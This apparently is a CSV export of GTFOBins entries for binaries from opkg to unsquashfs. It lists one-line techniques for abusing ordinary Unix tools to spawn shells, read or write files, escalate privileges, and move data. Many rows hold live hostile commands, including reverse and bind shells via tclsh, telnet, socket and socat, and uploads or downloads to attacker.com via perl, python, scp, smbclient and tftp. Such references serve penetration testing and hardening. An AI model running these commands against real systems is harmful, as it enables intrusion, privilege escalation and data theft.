Binary Name,URL,Description,Functions,Examples
opkg,https://gtfobins.org/gtfobins/opkg/,This executable can spawn an interactive system shell.,Shell,rpm opkg install x_1.0_all.deb
pandoc,https://gtfobins.org/gtfobins/pandoc/,This executable can read data from local files.,File read; File write; Inherit,"pandoc -t plain /path/to/input-file; echo DATA | pandoc -t plain -o /path/to/output-file; echo '...' >/path/to/temp-file
pandoc -L /path/to/temp-file /dev/null"
passwd,https://gtfobins.org/gtfobins/passwd/,"This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable.",Privilege escalation,echo -e 'x\nx' | passwd
paste,https://gtfobins.org/gtfobins/paste/,This executable can read data from local files.,File read,paste /path/to/input-file
pax,https://gtfobins.org/gtfobins/pax/,This executable can read data from local files.,File read,pax -w /path/to/input-file | tar -xO
pdb,https://gtfobins.org/gtfobins/pdb/,This executable can inherit functions from another.,Inherit,"echo '...' >/path/to/temp-file
pdb /path/to/temp-file
cont"
pdflatex,https://gtfobins.org/gtfobins/pdflatex/,This executable can read data from local files.,File read; File write; Shell,"pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
pdftotext texput.pdf -; pdflatex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'; pdflatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'"
pdftex,https://gtfobins.org/gtfobins/pdftex/,This executable can spawn an interactive system shell.,Shell,pdftex --shell-escape '\write18{/bin/sh}\end'
perf,https://gtfobins.org/gtfobins/perf/,This executable can spawn an interactive system shell.,Shell,perf stat /bin/sh; perf stat /bin/sh -p
perl,https://gtfobins.org/gtfobins/perl/,This executable can download remote data.,Download; File read; Reverse shell; Shell; Upload,"perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>""attacker.com"",PeerPort=>80,Proto=>""tcp"") or die; print $s ""GET /path/to/input-file HTTP/1.1\r\nHost: attacker.com\r\nMetadata: true\r\nConnection: close\r\n\r\n""; open(my $fh, "">"", ""/path/to/output-file"") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq ""\r\n"") { $in_content = 1; } } close($s); close($fh);'; python -m http.server 80; perl -ne print /path/to/input-file"
perlbug,https://gtfobins.org/gtfobins/perlbug/,This executable can spawn an interactive system shell.,Shell,perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh #'
pexec,https://gtfobins.org/gtfobins/pexec/,This executable can spawn an interactive system shell.,Shell,pexec /bin/sh; pexec /bin/sh -p
pg,https://gtfobins.org/gtfobins/pg/,This executable can read data from local files.,File read; Shell,"pg /path/to/input-file; pg /etc/hosts
!/bin/sh"
php,https://gtfobins.org/gtfobins/php/,This executable can run non-interactive system commands.,Command; Download; File read; File write; Reverse shell; Shell; Upload,"php -r 'echo shell_exec(""/path/to/command"");'; php -r '$r=array(); exec(""/path/to/command"", $r); print(join(""\n"",$r));'; php -r '$p = array(array(""pipe"",""r""),array(""pipe"",""w""),array(""pipe"", ""w""));$h = @proc_open(""/path/to/command"", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'"
pic,https://gtfobins.org/gtfobins/pic/,This executable can read data from local files.,File read; Shell,"pic /path/to/input-file; pic -U
.PS
sh X sh X"
pico,https://gtfobins.org/gtfobins/pico/,Alias of nano. This executable can read data from local files.,File read; File write; Shell,"nano /path/to/input-file; nano /path/to/output-file
DATA
^O; nano
^R^X
reset; sh 1>&0 2>&0"
pidstat,https://gtfobins.org/gtfobins/pidstat/,This executable can spawn an interactive system shell.,Shell,pidstat -e /bin/sh; pidstat -e /bin/sh -p
pip,https://gtfobins.org/gtfobins/pip/,This executable can inherit functions from another.,Inherit; Shell,"echo '...' >setup.py
pip install --break-system-packages .; pip config --editor '/bin/sh -s' edit"
pipx,https://gtfobins.org/gtfobins/pipx/,This executable can inherit functions from another.,Inherit,"echo '...' >/path/to/file.py
pipx run /path/to/file.py"
pkexec,https://gtfobins.org/gtfobins/pkexec/,This executable can spawn an interactive system shell.,Shell,pkexec /bin/sh
pkg,https://gtfobins.org/gtfobins/pkg/,This executable can run non-interactive system commands.,Command,pkg install -y --no-repo-update ./x-1.0.txz
plymouth,https://gtfobins.org/gtfobins/plymouth/,This executable can spawn an interactive system shell.,Shell,plymouth ask-for-password --prompt=x --command=/bin/sh; plymouth ask-for-password --prompt=x --command='/bin/sh -p'
podman,https://gtfobins.org/gtfobins/podman/,This executable can spawn an interactive system shell.,Shell,podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh
poetry,https://gtfobins.org/gtfobins/poetry/,This executable can inherit functions from another.,Inherit,"echo '...' >/path/to/temp-file
poetry run python /path/to/temp-file"
posh,https://gtfobins.org/gtfobins/posh/,This executable can spawn an interactive system shell.,Shell,posh
pr,https://gtfobins.org/gtfobins/pr/,This executable can read data from local files.,File read,pr -T /path/to/input-file
procmail,https://gtfobins.org/gtfobins/procmail/,This executable can run non-interactive system commands.,Command,"echo -e ':0\n| /path/to/command >/path/to/temp-file
procmail -m /path/to/temp-file"
pry,https://gtfobins.org/gtfobins/pry/,This executable can inherit functions from another.,Inherit,pry
psftp,https://gtfobins.org/gtfobins/psftp/,This executable can spawn an interactive system shell.,Shell,"psftp
!/bin/sh"
psql,https://gtfobins.org/gtfobins/psql/,A valid PostgreSQL server must be available to connect to.,Inherit; Shell,"psql
\?; psql
\! /bin/sh"
ptx,https://gtfobins.org/gtfobins/ptx/,"While the program is capable of reading the file, it outputs a ""permuted index"" of its content, thus altering it. Adjusting the options could yield more readable outputs.",File read,ptx -w 999 /path/to/input-file
puppet,https://gtfobins.org/gtfobins/puppet/,This executable can read data from local files.,File read; File write; Shell,"puppet filebucket -l diff /dev/null /path/to/input-file; puppet apply -e 'file { ""/path/to/output-file"": content => ""DATA"" }'; puppet apply -e ""exec { '/bin/sh <$(tty) >$(tty) 2>$(tty)': }"""
pwsh,https://gtfobins.org/gtfobins/pwsh/,This executable can write data to local files.,File write; Shell,"pwsh -c '""DATA"" | Out-File /path/to/output-file'; pwsh"
pygmentize,https://gtfobins.org/gtfobins/pygmentize/,This executable can read data from local files.,File read,pygmentize -l text /path/to/input-file
pyright,https://gtfobins.org/gtfobins/pyright/,This executable can read data from local files.,File read,pyright /path/to/input-file; pyright --outputjson /path/to/input-file; pyright -w /path/to/input-dir/
python,https://gtfobins.org/gtfobins/python/,The payloads are compatible with both Python version 2 and 3.,Download; File read; File write; Library load; Reverse shell; Shell; Upload,"python -c 'import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(""http://attacker.com/path/to/input-file"", ""/path/to/output-file"")'; python -m http.server 80; python -c 'print(open(""/path/to/input-file"").read())'"
qpdf,https://gtfobins.org/gtfobins/qpdf/,This executable can read data from local files.,File read,"qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file
qpdf --show-attachment=x /path/to/output-file"
R,https://gtfobins.org/gtfobins/R/,This executable can spawn an interactive system shell.,Shell,"R --no-save -e 'system(""/bin/sh"")'"
rake,https://gtfobins.org/gtfobins/rake/,This executable can read data from local files.,File read; Inherit,rake -f /path/to/input-file; rake -p '...'
ranger,https://gtfobins.org/gtfobins/ranger/,This executable can spawn an interactive system shell.,Shell,"ranger
S"
rc,https://gtfobins.org/gtfobins/rc/,This executable can spawn an interactive system shell.,Shell,rc
readelf,https://gtfobins.org/gtfobins/readelf/,This executable can read data from local files.,File read,readelf -a @/path/to/input-file
red,https://gtfobins.org/gtfobins/red/,Alias of ed. This executable can read data from local files.,File read; File write; Shell,"ed /path/to/input-file
,p
q; ed /path/to/output-file
a
DATA
.
w
q; ed
!/bin/sh
q"
redcarpet,https://gtfobins.org/gtfobins/redcarpet/,This executable can read data from local files.,File read,redcarpet /path/to/input-file
redis,https://gtfobins.org/gtfobins/redis/,This executable can write data to local files.,File write,"redis-cli -h 127.0.0.1
config set dir /path/to/output-dir/
config set dbfilename output-file
set x ""DATA""
save"
restic,https://gtfobins.org/gtfobins/restic/,This executable can run non-interactive system commands.,Command; Shell; Upload,"RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup; restic --password-command='/path/to/command' backup; RESTIC_PASSWORD_COMMAND='/bin/sh -c ""/bin/sh 0<&2 1<&2""' restic backup"
rev,https://gtfobins.org/gtfobins/rev/,This executable can read data from local files.,File read,rev /path/to/input-file | rev
rlogin,https://gtfobins.org/gtfobins/rlogin/,This executable can upload local data.,Upload,rlogin -l DATA -p 12345 attacker.com
rlwrap,https://gtfobins.org/gtfobins/rlwrap/,This executable can write data to local files.,File write; Shell,rlwrap -l /path/to/output-file echo DATA; rlwrap /bin/sh; rlwrap /bin/sh -p
rpm,https://gtfobins.org/gtfobins/rpm/,This executable can run non-interactive system commands.,Command; Inherit; Shell,rpm -ivh x-1.0-1.noarch.rpm; rpm --eval '%{lua:...}'; rpm --eval '%(/bin/sh 1>&2)'
rpmdb,https://gtfobins.org/gtfobins/rpmdb/,This executable can inherit functions from another.,Inherit; Shell,rpmdb --eval '%{lua:...}'; rpmdb --eval '%(/bin/sh 1>&2)'
rpmquery,https://gtfobins.org/gtfobins/rpmquery/,This executable can inherit functions from another.,Inherit; Shell,rpmquery --eval '%{lua:...}'; rpmquery --eval '%(/bin/sh 1>&2)'
rpmverify,https://gtfobins.org/gtfobins/rpmverify/,This executable can inherit functions from another.,Inherit; Shell,rpmverify --eval '%{lua:...}'; rpmverify --eval '%(/bin/sh 1>&2)'
rsync,https://gtfobins.org/gtfobins/rsync/,This executable can spawn an interactive system shell.,Shell,"rsync -e '/bin/sh -c ""/bin/sh 0<&2 1>&2""' x:x; rsync -e '/bin/sh -p -c ""/bin/sh -p 0<&2 1>&2""' x:x"
rsyslogd,https://gtfobins.org/gtfobins/rsyslogd/,This executable can run non-interactive system commands.,Command,"cat >/path/to/temp-file <<EOF
module(load=""imuxsock"")
:msg, contains, ""somerandomstring"" ^/path/to/command
EOF

rsyslogd -f /path/to/temp-file"
rtorrent,https://gtfobins.org/gtfobins/rtorrent/,This executable can spawn an interactive system shell.,Shell,"echo 'execute = /bin/sh,-c,""/bin/sh </dev/tty >/dev/tty 2>/dev/tty""' >~/.rtorrent.rc
rtorrent; echo 'execute = /bin/sh,-p,-c,""/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty""' >~/.rtorrent.rc
rtorrent"
ruby,https://gtfobins.org/gtfobins/ruby/,This executable can download remote data.,Download; File read; File write; Library load; Reverse shell; Shell; Upload,"ruby -e 'require ""open-uri""; download = URI.open(""http://attacker.com/path/to/input-file""); IO.copy_stream(download, ""/path/to/output-file"")'; python -m http.server 80; ruby -e 'puts File.read(""/path/to/input-file"")'"
run-mailcap,https://gtfobins.org/gtfobins/run-mailcap/,This executable can inherit functions from another.,Inherit,run-mailcap --action=view text/plain:/etc/hosts; run-mailcap --action=edit text/plain:/path/to/output-file
run-parts,https://gtfobins.org/gtfobins/run-parts/,This executable can spawn an interactive system shell.,Shell,"run-parts --new-session --regex '^sh$' /bin; run-parts --new-session --regex '^sh$' /bin --arg='-p'; cp /bin/sh /path/to/temp-dir/
run-parts /path/to/temp-dir/"
runscript,https://gtfobins.org/gtfobins/runscript/,This executable can spawn an interactive system shell.,Shell,"echo '! exec /bin/sh' >/path/to/temp-file
runscript /path/to/temp-file"
rustc,https://gtfobins.org/gtfobins/rustc/,This executable can read data from local files.,File read; File write; Inherit,"rustc /path/to/input-file; echo 'fn main() { println!(""DATA""); }' >/path/to/temp-file
rustc /path/to/temp-file -o /path/to/output-file; rustc --explain E0001"
rustdoc,https://gtfobins.org/gtfobins/rustdoc/,This executable can read data from local files.,File read; File write,"rustdoc /path/to/input-file; echo '//! DATA' >/path/to/temp-file
rustdoc /path/to/temp-file -o /path/to/output-dir/"
rustfmt,https://gtfobins.org/gtfobins/rustfmt/,This executable can read data from local files.,File read,rustfmt /path/to/input-file
rustup,https://gtfobins.org/gtfobins/rustup/,This executable can run non-interactive system commands.,Command; Shell,"mkdir /path/to/temp-dir/bin/
mkdir /path/to/temp-dir/lib/
echo '/path/to/command' >/path/to/temp-dir/bin/rustc
chmod +x /path/to/temp-dir/bin/rustc
rustup toolchain link x /path/to/temp-dir/
rustup run x rustc; mkdir /path/to/temp-dir/bin/
mkdir /path/to/temp-dir/lib/
cp /bin/sh /path/to/temp-dir/bin/rustc
rustup toolchain link x /path/to/temp-dir/
rustup run x rustc"
rview,https://gtfobins.org/gtfobins/rview/,Alias of view. This executable can read data from local files.,File read; Inherit,"vim -c ':redir! >/path/to/output-file | echo ""DATA"" | redir END | q'; vim -c ':py ...'; vim -c ':lua ...'"
rvim,https://gtfobins.org/gtfobins/rvim/,Alias of vim. This executable can read data from local files.,File read; Inherit,"vim -c ':redir! >/path/to/output-file | echo ""DATA"" | redir END | q'; vim -c ':py ...'; vim -c ':lua ...'"
sash,https://gtfobins.org/gtfobins/sash/,This executable can spawn an interactive system shell.,Shell,sash
scanmem,https://gtfobins.org/gtfobins/scanmem/,This executable can spawn an interactive system shell.,Shell,"scanmem
shell /bin/sh"
scp,https://gtfobins.org/gtfobins/scp/,This executable can download remote data.,Download; Shell; Upload,"scp user@attacker.com:/path/to/input-file /path/to/output-file; echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file
chmod +x /path/to/temp-file
scp -S /path/to/temp-file x x:; scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:"
screen,https://gtfobins.org/gtfobins/screen/,This executable can write data to local files.,File write; Shell,screen -L -Logfile /path/to/output-file echo DATA; screen -L /path/to/output-file echo DATA; screen
script,https://gtfobins.org/gtfobins/script/,This executable can write data to local files.,File write; Shell,script -q -c '# DATA' /path/to/output-file; script -q /dev/null
scrot,https://gtfobins.org/gtfobins/scrot/,This requires a running X server.,Shell,scrot -e /bin/sh
sed,https://gtfobins.org/gtfobins/sed/,This executable can read data from local files.,File read; File write; Shell,sed '' /path/to/input-file; sed -n '1s/.*/DATA/w /path/to/output-file' /etc/hosts; sed -n '1e exec /bin/sh 1>&0' /etc/hosts
service,https://gtfobins.org/gtfobins/service/,This executable can spawn an interactive system shell.,Shell,service ../../bin/sh
setarch,https://gtfobins.org/gtfobins/setarch/,This executable can spawn an interactive system shell.,Shell,setarch -3 /bin/sh; setarch -3 /bin/sh -p
setcap,https://gtfobins.org/gtfobins/setcap/,"This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable.",Privilege escalation,setcap cap_setuid+ep /path/to/command
setfacl,https://gtfobins.org/gtfobins/setfacl/,"This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable.",Privilege escalation,setfacl -m u:$(id -un):rwx /path/to/input-file
setlock,https://gtfobins.org/gtfobins/setlock/,This executable can spawn an interactive system shell.,Shell,setlock - /bin/sh; setlock - /bin/sh -p
sftp,https://gtfobins.org/gtfobins/sftp/,This executable can download remote data.,Download; Shell; Upload,"sftp user@attacker.com
get /path/to/input-file /path/to/output-file; sftp user@attacker.com
!/bin/sh; sftp user@attacker.com
put /path/to/input-file /path/to/output-file"
sg,https://gtfobins.org/gtfobins/sg/,This executable can spawn an interactive system shell.,Shell,sg $(id -ng); sg root
shred,https://gtfobins.org/gtfobins/shred/,This executable can write data to local files.,File write,shred -u /path/to/output-file
shuf,https://gtfobins.org/gtfobins/shuf/,This executable can read data from local files.,File read; File write,shuf -z /path/to/input-file; shuf -e DATA -o /path/to/output-file
slsh,https://gtfobins.org/gtfobins/slsh/,This executable can spawn an interactive system shell.,Shell,"slsh -e 'system(""/bin/sh"")'"
smbclient,https://gtfobins.org/gtfobins/smbclient/,This executable can download remote data.,Download; Shell; Upload,"smbclient '\\attacker.com\share' -c 'get /path/to/input-file /path/to/output-file'; smbclient '\\host\share'
!/bin/sh; smbclient '\\attacker.com\share' -c 'put /path/to/input-file /path/to/output-file'"
snap,https://gtfobins.org/gtfobins/snap/,This executable can run non-interactive system commands.,Command,snap install xxxx_1.0_all.snap --dangerous --devmode
socat,https://gtfobins.org/gtfobins/socat/,This executable can bind a system shell to a local port waiting for an attacker to connect.,Bind shell; Download; File read; File write; Reverse shell; Shell; Upload,"socat tcp-listen:12345,reuseaddr,fork exec:/bin/sh,pty,stderr,setsid,sigint,sane; socat tcp-listen:12345,reuseaddr,fork 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'; socat file:/dev/tty,raw,echo=0 tcp:victim.com:12345"
socket,https://gtfobins.org/gtfobins/socket/,This executable can bind a system shell to a local port waiting for an attacker to connect.,Bind shell; Reverse shell,socket -svp '/bin/sh -i' 12345; nc victim.com 12345; socket -qvp '/bin/sh -i' attacker.com 12345
soelim,https://gtfobins.org/gtfobins/soelim/,This executable can read data from local files.,File read,soelim /path/to/input-file
softlimit,https://gtfobins.org/gtfobins/softlimit/,This executable can spawn an interactive system shell.,Shell,softlimit /bin/sh; softlimit /bin/sh -p
sort,https://gtfobins.org/gtfobins/sort/,This executable can read data from local files.,File read; File write,sort -m /path/to/input-file; echo DATA | sort -m -o /path/to/output-file
split,https://gtfobins.org/gtfobins/split/,This executable can read data from local files.,File read; File write; Shell,"split -b 999 --additional-suffix suffix /path/to/input-file prefix
cat prefixaasuffix; split -b 999 --additional-suffix suffix /path/to/input-file prefix; split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts"
sqlite3,https://gtfobins.org/gtfobins/sqlite3/,This executable can read data from local files.,File read; File write; Shell,"sqlite3 <<EOF
CREATE TABLE x(x TEXT);
.import /path/to/input-file x
SELECT * FROM x;
EOF; sqlite3 /dev/null -cmd '.output /path/to/output-file' 'select ""DATA"";'; sqlite3 /dev/null '.shell /bin/sh'"
sqlmap,https://gtfobins.org/gtfobins/sqlmap/,This executable can inherit functions from another.,Inherit,sqlmap -u 127.0.0.1 --eval='...'
ss,https://gtfobins.org/gtfobins/ss/,This executable can read data from local files.,File read,ss -a -F /path/to/input-file
ssh,https://gtfobins.org/gtfobins/ssh/,This executable can download remote data.,Download; File read; Shell; Upload,"ssh user@attacker.com 'cat /path/to/input-file""; ssh -F /path/to/input-file x; ssh localhost /bin/sh"
ssh-agent,https://gtfobins.org/gtfobins/ssh-agent/,This executable can spawn an interactive system shell.,Shell,ssh-agent /bin/sh; ssh-agent /bin/sh -p
ssh-copy-id,https://gtfobins.org/gtfobins/ssh-copy-id/,This executable can read data from local files.,File read; File write,ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com; ssh-copy-id -f -i /path/to/input-file.pub -t /path/to/output-file user@host
ssh-keygen,https://gtfobins.org/gtfobins/ssh-keygen/,This executable can load shared libraries that may be used to run arbitrary code in the same execution context.,Library load,"ssh-keygen -D /path/to/lib.so; echo '__attribute__((constructor)) init() { execl(""/bin/sh"", ""sh"", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -"
ssh-keyscan,https://gtfobins.org/gtfobins/ssh-keyscan/,This executable can read data from local files.,File read,ssh-keyscan -f /path/to/input-file
sshfs,https://gtfobins.org/gtfobins/sshfs/,This executable can run non-interactive system commands.,Command; Download; Shell; Upload,"sshfs -o ssh_command=/path/to/command x: /path/to/dir/; sshfs user@attacker.com:/ /path/to/dir/
cp /path/to/dir/path/to/input-file /path/to/output-file; echo -e '/bin/sh </dev/tty >/dev/tty 2>/dev/tty' >/path/to/temp-file
chmod +x /path/to/temp-file
sshfs -o ssh_command=/path/to/temp-file x: /path/to/dir/"
sshpass,https://gtfobins.org/gtfobins/sshpass/,This executable can spawn an interactive system shell.,Shell,sshpass /bin/sh; sshpass /bin/sh -p
sshuttle,https://gtfobins.org/gtfobins/sshuttle/,This executable can spawn an interactive system shell.,Shell,"sudo sshuttle -r x --ssh-cmd '/bin/sh -c ""/bin/sh 0<&2 1>&2""' localhost"
start-stop-daemon,https://gtfobins.org/gtfobins/start-stop-daemon/,This executable can spawn an interactive system shell.,Shell,start-stop-daemon -S -x /bin/sh; start-stop-daemon -S -x /bin/sh -- -p
stdbuf,https://gtfobins.org/gtfobins/stdbuf/,This executable can spawn an interactive system shell.,Shell,stdbuf -i0 /bin/sh; stdbuf -i0 /bin/sh -p
strace,https://gtfobins.org/gtfobins/strace/,This executable can write data to local files.,File write; Shell,strace -s 999 -o /path/to/output-file strace - DATA; strace -o /dev/null /bin/sh; strace -o /dev/null /bin/sh -p
strings,https://gtfobins.org/gtfobins/strings/,This executable can read data from local files.,File read,strings /path/to/input-file
su,https://gtfobins.org/gtfobins/su/,This executable can spawn an interactive system shell.,Shell,su -c /bin/sh
sudo,https://gtfobins.org/gtfobins/sudo/,This executable can spawn an interactive system shell.,Shell,sudo /bin/sh
sysctl,https://gtfobins.org/gtfobins/sysctl/,This executable can run non-interactive system commands.,Command; File read,"sysctl 'kernel.core_pattern=|/path/to/command'; sysctl -n ""/../../path/to/input-file"""
systemctl,https://gtfobins.org/gtfobins/systemctl/,This executable can inherit functions from another.,Inherit; Shell,"systemctl; echo '[Service]
Type=oneshot
ExecStart=/path/to/command
[Install]
WantedBy=multi-user.target' >/path/to/temp-file.service
systemctl link /path/to/temp-file.service
systemctl enable --now /path/to/temp-file.service; echo /bin/sh >/path/to/temp-file
chmod +x /path/to/temp-file
SYSTEMD_EDITOR=/path/to/temp-file systemctl edit basic.target"
systemd-resolve,https://gtfobins.org/gtfobins/systemd-resolve/,This executable can inherit functions from another.,Inherit,systemd-resolve --status
systemd-run,https://gtfobins.org/gtfobins/systemd-run/,This executable can run non-interactive system commands.,Command; Shell,systemd-run /path/to/command; systemd-run -S; systemd-run -t /bin/sh
tac,https://gtfobins.org/gtfobins/tac/,This executable can read data from local files.,File read,tac -s 'RANDOM' /path/to/input-file
tail,https://gtfobins.org/gtfobins/tail/,This executable can read data from local files.,File read,tail -c+0 /path/to/input-file
tailscale,https://gtfobins.org/gtfobins/tailscale/,This executable can upload local data.,Upload,tailscale serve --http=12345 /path/to/input-file
tar,https://gtfobins.org/gtfobins/tar/,This executable can download remote data.,Download; File read; File write; Shell; Upload,"tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh; tar cf /dev/stdout /path/to/input-file -I 'tar xO'; echo DATA >/path/to/temp-file
tar cf /path/to/temp-file.tar /path/to/temp-file
tar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@"
task,https://gtfobins.org/gtfobins/task/,This executable can spawn an interactive system shell.,Shell,task execute /bin/sh
taskset,https://gtfobins.org/gtfobins/taskset/,This executable can spawn an interactive system shell.,Shell,taskset 1 /bin/sh
tasksh,https://gtfobins.org/gtfobins/tasksh/,This executable can spawn an interactive system shell.,Shell,"tasksh
!/bin/sh"
tbl,https://gtfobins.org/gtfobins/tbl/,This executable can read data from local files.,File read,tbl /path/to/input-file
tclsh,https://gtfobins.org/gtfobins/tclsh/,This executable can load shared libraries that may be used to run arbitrary code in the same execution context.,Library load; Reverse shell; Shell,"tclsh
load /path/to/lib.so x; echo '__attribute__((constructor)) init() { execl(""/bin/sh"", ""sh"", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -; tclsh
set s [socket attacker.com 12345];while 1 { puts -nonewline $s ""> "";flush $s;gets $s c;set e ""exec $c"";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;"
tcpdump,https://gtfobins.org/gtfobins/tcpdump/,This executable can run non-interactive system commands.,Command; File write,"echo /path/to/command >/path/to/temp-file
chmod +x /path/to/temp-file
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /path/to/temp-file; echo /path/to/command"" >/path/to/temp-file
chmod +x /path/to/temp-file
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /path/to/temp-file -Z root; tcpdump -ln -i lo -w 'command-argument' -W 1 -G 1 -z /path/to/command"
tcsh,https://gtfobins.org/gtfobins/tcsh/,This executable can write data to local files.,File write; Shell,tcsh -c 'echo DATA >/path/to/output-file'; tcsh -bc 'echo DATA >/path/to/output-file'; tcsh
tdbtool,https://gtfobins.org/gtfobins/tdbtool/,This executable can spawn an interactive system shell.,Shell,"tdbtool
! /bin/sh"
tee,https://gtfobins.org/gtfobins/tee/,This executable can write data to local files.,File write,echo DATA | tee /path/to/output-file
telnet,https://gtfobins.org/gtfobins/telnet/,This executable can send back a reverse system shell to a listening attacker.,Reverse shell; Shell,"mkfifo /path/to/temp-socket
telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket; telnet
!/bin/sh"
terraform,https://gtfobins.org/gtfobins/terraform/,This executable can read data from local files.,File read,"terraform console
file(""/path/to/input-file"")"
tex,https://gtfobins.org/gtfobins/tex/,This executable can spawn an interactive system shell.,Shell,tex --shell-escape '\immediate\write18{/bin/sh}'
tftp,https://gtfobins.org/gtfobins/tftp/,This executable can download remote data.,Download; Upload,"tftp attacker.com
get /path/to/input-file; tftp attacker.com
put /path/to/input-file"
tic,https://gtfobins.org/gtfobins/tic/,This executable can read data from local files.,File read,tic -C /path/to/input-file
time,https://gtfobins.org/gtfobins/time/,This executable can spawn an interactive system shell.,Shell,time /bin/sh; time /bin/sh -p
timedatectl,https://gtfobins.org/gtfobins/timedatectl/,This might not work if run by unprivileged users depending on the system configuration.,Inherit,timedatectl list-timezones
timeout,https://gtfobins.org/gtfobins/timeout/,This executable can spawn an interactive system shell.,Shell,timeout 0 /bin/sh; timeout 0 /bin/sh -p
tmate,https://gtfobins.org/gtfobins/tmate/,This executable can spawn an interactive system shell.,Shell,tmate -c /bin/sh
tmux,https://gtfobins.org/gtfobins/tmux/,This executable can read data from local files.,File read; Shell,tmux -f /path/to/input-file; tmux -c /bin/sh; tmux -S /path/to/socket
top,https://gtfobins.org/gtfobins/top/,This executable can spawn an interactive system shell.,Shell,"echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
top
# press return twice
reset"
torify,https://gtfobins.org/gtfobins/torify/,This executable can spawn an interactive system shell.,Shell,torify /bin/sh
torsocks,https://gtfobins.org/gtfobins/torsocks/,This executable can spawn an interactive system shell.,Shell,torsocks /bin/sh
troff,https://gtfobins.org/gtfobins/troff/,This executable can read data from local files.,File read,troff /path/to/input-file
tsc,https://gtfobins.org/gtfobins/tsc/,This executable can read data from local files.,File read; File write,tsc /path/to/input-file.ts; tsc /path/to/input-file.ts --outFile /path/to/output-file
tshark,https://gtfobins.org/gtfobins/tshark/,This executable can inherit functions from another.,Inherit,"echo '...' >/path/to/temp-file
tshark -Xlua_script:/path/to/temp-file"
ul,https://gtfobins.org/gtfobins/ul/,This executable can read data from local files.,File read,ul /path/to/input-file
unexpand,https://gtfobins.org/gtfobins/unexpand/,This executable can read data from local files.,File read,unexpand -t999 /path/to/input-file
uniq,https://gtfobins.org/gtfobins/uniq/,This executable can read data from local files.,File read,uniq /path/to/input-file
unshare,https://gtfobins.org/gtfobins/unshare/,This executable can spawn an interactive system shell.,Shell,unshare /bin/sh; unshare -r /bin/sh
unsquashfs,https://gtfobins.org/gtfobins/unsquashfs/,"`unsquashfs` preserve the SUID bit when extracting the file system. For example, prepare an archive beforehand with the following commands as root: ``` cp /bin/sh . chmod +s sh mksquashfs sh shell ```",Privilege escalation,"unsquashfs shell
./squashfs-root/sh -p"
